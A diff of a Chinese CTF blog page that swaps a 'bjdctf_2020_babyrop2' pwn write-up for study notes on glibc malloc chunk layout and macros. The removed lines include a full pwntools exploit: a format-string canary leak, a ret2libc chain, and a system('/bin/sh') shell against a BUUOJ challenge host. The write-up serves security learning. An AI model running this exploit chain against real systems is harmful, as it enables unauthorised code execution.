@@ -19,26 +19,33 @@
   <meta name="author" content="yyf">
   <meta name="keywords" content="">
   
-    <meta name="description" content="checksec 可以看到有开canary，可能需要绕过 IDA 12345678910111213unsigned __int64 gift()&#123;  char format[8]; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-8h]  v2 &#x3D; __readfsqword(0x28u);  put">
+    <meta name="description" content="5.1边界标记法  size_t 32位下4字节，64位下4字节或8字节 分配chunk必须与2*SIZE_SZ(size_t)对齐 倒三倒四的#是用来处理chunk地址对齐的宏 &#x3D;&#x3D;32平台下chunk地址按8字节对齐，64位按8字节或16字节对齐&#x3D;&#x3D;   使用结构体来描述这些chunk  prev_size：前一个块是空闲时，表示前一个块大小，若不空闲则">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bjdctf_2020_babyrop2">
-<meta property="og:url" content="http://yyyffff.github.io/2025/02/05/bjdctf-2020-babyrop2/index.html">
+<meta property="og:title" content="malloc源码学习">
+<meta property="og:url" content="http://yyyffff.github.io/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="yyyffff">
-<meta property="og:description" content="checksec 可以看到有开canary，可能需要绕过 IDA 12345678910111213unsigned __int64 gift()&#123;  char format[8]; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-8h]  v2 &#x3D; __readfsqword(0x28u);  put">
+<meta property="og:description" content="5.1边界标记法  size_t 32位下4字节，64位下4字节或8字节 分配chunk必须与2*SIZE_SZ(size_t)对齐 倒三倒四的#是用来处理chunk地址对齐的宏 &#x3D;&#x3D;32平台下chunk地址按8字节对齐，64位按8字节或16字节对齐&#x3D;&#x3D;   使用结构体来描述这些chunk  prev_size：前一个块是空闲时，表示前一个块大小，若不空闲则">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/ctf-2020-babyrop2/1738725643074.png">
-<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/ctf-2020-babyrop2/1738725725804.png">
-<meta property="article:published_time" content="2025-02-05T03:16:19.000Z">
-<meta property="article:modified_time" content="2025-02-05T05:32:52.342Z">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175742174.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175983933.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176396167.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176416592.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739178289931.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739247145745.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739264274475.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739267841775.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271421329.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271511827.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739272311840.png">
+<meta property="article:published_time" content="2025-02-09T07:09:53.000Z">
+<meta property="article:modified_time" content="2025-02-11T17:17:11.890Z">
 <meta property="article:author" content="yyf">
-<meta property="article:tag" content="canary绕过">
-<meta property="article:tag" content="ret2libc">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/ctf-2020-babyrop2/1738725643074.png">
+<meta name="twitter:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175742174.png">
   
   
   
-  <title>bjdctf_2020_babyrop2 - yyyffff</title>
+  <title>malloc源码学习 - yyyffff</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -217,7 +224,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="bjdctf_2020_babyrop2"></span>
+            <span id="subtitle" data-typed-text="malloc源码学习"></span>
           
         </div>
 
@@ -228,8 +235,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-05 11:16" pubdate>
-          2025年2月5日 上午
+        <time datetime="2025-02-09 15:09" pubdate>
+          2025年2月9日 下午
         </time>
       </span>
     
@@ -240,7 +247,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          466 字
+          1.4k 字
         
       </span>
     
@@ -251,7 +258,7 @@
         
         
         
-          4 分钟
+          12 分钟
         
       </span>
     
@@ -297,38 +304,101 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">bjdctf_2020_babyrop2</h1>
+            <h1 id="seo-header">malloc源码学习</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/ctf-2020-babyrop2/1738725643074.png" srcset="/img/loading.gif" lazyload alt="checksec"></p>
-<p>可以看到有开canary，可能需要绕过</p>
-<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/ctf-2020-babyrop2/1738725725804.png" srcset="/img/loading.gif" lazyload alt="IDA"></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">gift</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(byte_400A05);<br>  fflush(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>看到有格式化字符串漏洞，可以利用来泄露canary</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64u</span>LL);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>存在栈溢出</p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>首先利用格式化字符串来泄露canary，由于是64位，栈上数据是从%6&amp;p起</p>
+                <h1 id="5-1边界标记法"><a href="#5-1边界标记法" class="headerlink" title="5.1边界标记法"></a>5.1边界标记法</h1><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175742174.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <ul>
-<li>利用gdb查看canary位置</li>
+<li>size_t 32位下4字节，64位下4字节或8字节</li>
+<li>分配chunk必须与2*SIZE_SZ(size_t)对齐</li>
+<li>倒三倒四的#是用来处理chunk地址对齐的宏</li>
+<li><strong>&#x3D;&#x3D;32平台下chunk地址按8字节对齐，64位按8字节或16字节对齐&#x3D;&#x3D;</strong></li>
 </ul>
-<p>发现在栈上第二个，也就是%7$p，所以</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>r.recvuntil(<span class="hljs-string">b&#x27;help u!\n&#x27;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<span class="hljs-comment"># 将16进制字符串转换为整数</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:  &quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br></code></pre></td></tr></table></figure>
-
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175983933.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>使用结构体来描述这些chunk</p>
 <ul>
-<li>接着ret2libc</li>
+<li>prev_size：前一个块是<strong>空闲时</strong>，表示前一个块大小，若不空闲则无意义</li>
+<li>size：记录<strong>当前chunk大小和当前的和前一个chunk一些属性</strong>：是否在使用中、当前chunk是否是通过mmap分配，当前chunk是否属于主分配去</li>
+<li>fd,bk：<strong>当前chunk空闲时</strong>存在的两个指针，用于链表管理，若已分配，则<strong>作为应用程序的使用空间</strong></li>
+<li>fd_nextsize,bk_nextsize：当前chunk存在与large bins中时， fd_nextsize 指向下一个比当前 chunk 大小 &#x3D;&#x3D;大&#x3D;&#x3D;的第一个空闲 chunk，bk_nextszie 指向前一个比当前 chunk 大小&#x3D;&#x3D;小&#x3D;&#x3D;的第一个空闲 chunk ，<br>若已分配，则也作为<strong>程序的使用空间</strong><ul>
+<li><strong>Fast Bins</strong>：用于管理小内存块（通常小于 64 字节），采用单链表结构，分配和释放速度较快。</li>
+<li><strong>Small Bins</strong>：用于管理中等大小的内存块（通常小于 512 字节），采用双向链表结构。</li>
+<li><strong>Large Bins</strong>：用于管理较大的内存块（通常大于 512 字节），采用双向链表结构，并按大小排序。</li>
+<li><strong>Unsorted Bins</strong>：用于临时存放释放的内存块，后续会根据大小将其移动到 <code>small bins</code> 或 <code>large bins</code>。</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)<br>payload+=p64(vuln_addr)<br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>r.sendline(payload)<br></code></pre></td></tr></table></figure>
-
-<p>然后公式计算libc基地址，system，&#x2F;bin&#x2F;sh地址，再进行一次栈溢出即可</p>
+</li>
+</ul>
+<p>已分配的</p>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176396167.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p>free中的</p>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176416592.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p>可以看到已分配中的fd和bk作为了程序可以使用的空间</p>
 <ul>
-<li>完整脚本：</li>
+<li>通过 <code>mmap</code> 分配的块，在它们的大小字段中设置了第二低的位 M（IS_MMAPPED）。因为它们是one by one分配的，所以每个块都必须包含自己的尾随大小字段，是独立于堆的。</li>
+<li>P（PREV_INUSE）位存储在块大小的未使用的最低位中 ，标记前一个块是否被使用，1 使用，0 空闲。<strong>状态为0时</strong>，当前chunk包含前一个chunk大小及位置。第一个chunk总是被设置，防止访问错误</li>
+<li>特殊块 <code>top</code> 不使用尾随大小字段，因为<strong>没有下一个连续块</strong>需要通过它来索引。在初始化后，<code>top</code> 始终存在。如果它变得小于 MINSIZE 字节长，它会被重新填充。</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;AMD64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bbrop2&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29194</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bbrop2&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23_64.so&#x27;</span>)<br>vuln_addr=<span class="hljs-number">0x400887</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret_addr=<span class="hljs-number">0x4005f9</span><br>rdi_addr=<span class="hljs-number">0x400993</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>payload=<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>r.recvuntil(<span class="hljs-string">b&#x27;help u!\n&#x27;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:  &quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)<br>payload+=p64(vuln_addr)<br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>r.sendline(payload)<br><br>puts_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(sys_addr)<br>payload+=p64(vuln_addr)<br>r.sendline(payload)<br><span class="hljs-comment">#pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure>
-
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739178289931.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<ul>
+<li>chunk2mem：通过chunk地址获得返回<strong>给用户</strong>内存地址（mem的地址）</li>
+<li>mem2chunk：通过mem的地址<strong>得到chunk的地址</strong></li>
+<li>mem地址同样2*SIZE_SZ对齐（前两个域刚好是2*SIZE_SZ大小）</li>
+<li>宏 aligned_OK 和 misaligned_chunk(p)用于校验地址是否是按 2*SIZE_SZ 对齐的 </li>
+<li>MIN_CHUNK_SIZE 定义了<strong>最小的</strong> chunk 的大小，<strong>32 位平台上位 16 字节，64 位平台为 24 字节或是 32 字节</strong> </li>
+<li>MINSIZE是最小的分配的内存大小</li>
+</ul>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739247145745.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p>这几个宏将用户请求的大小转换为实际上需要分配的大小</p>
+<ul>
+<li><p>在linux X86_64平台中，假设SIZE_SZ为8字节，空闲时，一个chunk至少要有4<em>size_t空间（来存储prev_size,size,fd,bk）也就是*<em>MINSIZE（32B）</em></em></p>
+</li>
+<li><p>可以看到转换时不但考虑地址对齐，还<strong>额外加上了SIZE_SZ</strong>，原因：</p>
+<p>对于一个使用中的chunk，其下一个chunk的pre_size处于无效的，可以被当前chunk所使用，所以<strong>in_use_size&#x3D;(用户请求大小 +16(pre_size+size)-8(借了下一个chunk的pre_size)) align to 8B</strong></p>
+<p>又因为空闲时的chunk和使用中的chunk使用的是同一块空间，所以取最大者为实际分配的空间，所以最终chunk_size&#x3D;max(in_use_size,32(MINSIZE))</p>
+</li>
+<li><p>如果chunk由mmap直接分配，就不会有前一个和后一个chunk，所以借不到下一个chunk的pre_size，所以overhead&#x3D;2*SIZE_SZ</p>
+</li>
+</ul>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739264274475.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p>chunk分割时总是以地址对齐（默认8字节，但也可以自己设置（alignment&#x3D;2^n,  n是整数且n&gt;&#x3D;3））所以chunk-&gt;size末3bit总是0，比如说8的二进制为1000，用来存储其他信息：</p>
+<ul>
+<li>第0位作为P状态位，记录前一chunk是否在使用中 1使用，0空闲</li>
+<li>第1位M状态位，标记本chunk是否是mmap分配，1是0否</li>
+<li>第2位A状态位，标记本chunk是否属于<strong>非主分配区</strong>，1是0否</li>
+</ul>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739267841775.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<ul>
+<li>pre_size记录的信息：<ul>
+<li>前一个chunk空闲，pre_size记录前一个chunk的大小，这就是通过当前chunk指针获得前一个空闲chunk<strong>地址</strong>的依据，宏prev_chunk(p)就是这样实现的</li>
+<li>前一个chunk在使用中。pre_size无意义</li>
+</ul>
+</li>
+<li>size记录本chunk大小，可通过本chunk大小+本chunk地址得到下一个chunk的地址，由于size低三位记录控制信息，取出实际size在计算时需要注意。这是next_chunk(p)实现原理</li>
+<li>chunksize(p)用于获得chunk实际大小，需要屏蔽size中控制信息</li>
+<li>chunk_at_offset(p,s)将p+s地址强制看作一个chunk<ul>
+<li>p是当前chunk地址</li>
+<li>作用<ul>
+<li>获取相邻chunk</li>
+<li>合并空闲chunk</li>
+<li>遍历堆内存</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>注意，可以有多个连续并且正在使用中的chunk，但不会有多个连续空闲chunk（会合并为一个大的空闲chunk）</li>
+</ul>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271421329.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<p>这组宏用于check&#x2F;set&#x2F;clear当前chunk<strong>使用</strong>标志位，<strong>因为当前chunk信息存储在下一个chunk中</strong>，所以要先获取下一个chunk地址再操作</p>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271511827.png" srcset="/img/loading.gif" lazyload alt="9"></p>
+<p>这三个用于check&#x2F;set&#x2F;clear<strong>指定chunk</strong>的size中的使用表示位</p>
+<p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739272311840.png" srcset="/img/loading.gif" lazyload alt="10"></p>
+<ul>
+<li><strong><code>set_head_size(p, s)</code></strong>  设置当前 chunk 的 <code>size</code> 域，并保留标志位 </li>
+<li><strong><code>set_head(p, s)</code></strong>  设置当前 chunk 的 <code>size</code> 域，并忽略标志位 </li>
+<li><strong><code>set_foot(p, s)</code></strong>  设置下一个 chunk 的 <code>prev_size</code> 为当前 chunk 的大小 W</li>
+</ul>
 
                 
               </div>
@@ -347,7 +417,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">buu做题记录</a>
+  <a href="/categories/2025%E5%86%AC%E4%BB%A4%E8%90%A5/" class="category-chain-item">2025冬令营</a>
   
   
 
@@ -359,15 +429,6 @@
     </div>
   
   
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/canary%E7%BB%95%E8%BF%87/" class="print-no-link">#canary绕过</a>
-      
-        <a href="/tags/ret2libc/" class="print-no-link">#ret2libc</a>
-      
-    </div>
-  
 </div>
 
 
@@ -376,8 +437,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>bjdctf_2020_babyrop2</div>
-      <div>http://yyyffff.github.io/2025/02/05/bjdctf-2020-babyrop2/</div>
+      <div>malloc源码学习</div>
+      <div>http://yyyffff.github.io/2025/02/09/malloc源码学习/</div>
     </div>
     <div class="license-meta">
       
@@ -389,7 +450,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月5日</div>
+          <div>2025年2月9日</div>
         </div>
       
       
@@ -421,18 +482,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/" title="malloc源码学习">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">malloc源码学习</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="格式化字符串">
-                        <span class="hidden-mobile">格式化字符串</span>
+                      <a href="/2025/02/05/bjdctf-2020-babyrop2/" title="bjdctf_2020_babyrop2">
+                        <span class="hidden-mobile">bjdctf_2020_babyrop2</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
